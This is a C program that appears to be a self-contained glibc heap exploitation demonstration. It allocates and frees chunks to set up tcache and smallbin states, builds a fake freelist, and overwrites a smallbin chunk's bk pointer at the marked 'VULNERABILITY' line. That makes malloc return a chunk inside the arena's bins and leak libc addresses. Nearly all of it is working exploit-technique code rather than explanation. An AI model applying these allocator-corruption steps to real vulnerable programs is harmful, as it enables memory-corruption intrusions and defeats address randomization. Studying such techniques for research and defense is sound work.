#include <stdlib.h>
#include <assert.h>
#include <stdio.h>

int main(int argc, char * argv[]){
	//the smallbin chunk we will overwrite the bk of
	char *victim = malloc(0x510);
	//the chunk we will overwrite in its tcache entry
	//its entry is the one immediately following the one
	//corresponding to victim size
	char *tcache_target = malloc(0x110);
	char *tcache = (char*)victim - 0x250;
	//chunk we will use to write a bin address in our 
	//allocated area in the arena
	char *freed = malloc(0x500);
	//to avoid consolidation with top
	char *guard = malloc(0x1000);
	//put victim in unsorted bin
	free(victim);
	//allocate a chunk that will be cut from victim 
	//the size of the remainder is 0x110(with metadata)
	char *trim_victim = malloc(0x400);
	//update victim to reflect the trim
	victim += 0x410;
	//the victim including metadata
	char **victim_chunk = (char **)victim-2;

	//free freed , it will be put in the unsorted bin
	free(freed);
	//this trims freed and sorts victim to its smallbin
	char *trim_freed = malloc(0x400);
	//update freed to reflect the trim
	freed += 0x410;
	//freed including metadata
	char **freed_chunk = (char **)freed-2;

	tcache += 0x40 + (int)(0x110/0x10 - 1 )*8 ;
	//sort freed into the small bin
	void *sort_freed = malloc(0x1000);
	//putting tcache_target in tcache
	free(tcache_target);

	//keep the address of the smallbin for later sanity check
	char *smallbin = victim_chunk[2];
	//keep the address of the leaked smallbin for later sanity check
	char *smallbin_leak_check = freed_chunk[2];

	//create a fake freelist on the heap , we can use 
	//the trim result for that
	char * (*freelist)[4] = (char * (*)[4])trim_victim;
	//links the fake list chunks
	for(int i=0; i<6; i++) {
		freelist[i][3] = (char*) freelist[i+1];
	}
	//to bypass the smallbin fd check
	freelist[0][2] = (char *) victim_chunk;


	//the address of the smallbin will be written to 
	//(freelist[6]->bk)->fd 
	freelist[6][3] = (void*)tcache-0x10;

	//------------VULNERABILITY-----------
	victim_chunk[3] = (char *)freelist[0]; 
	//------------------------------------

	//this allocates victim and starts filling tcache with chunks from
	//our freelist 
	char *p3 = malloc(0x100);
	//this allocates the smallbin address
	char **p5 = malloc(0x110);
	assert((long)p5 == (long)smallbin);
	//initialize where we landed with freed_chunk 
	//which we can calculate with the heap leak
	p5[0] = p5[1] = (char *)freed_chunk;

	//allocate size of freed to trigger the leak
	char *trigger_leak = malloc(0xf0);
	//the bin bins where we allocated now has bin addresses
	char *leak = p5[0];
	assert((long)leak == (long)smallbin_leak_check);
	exit(0);
}
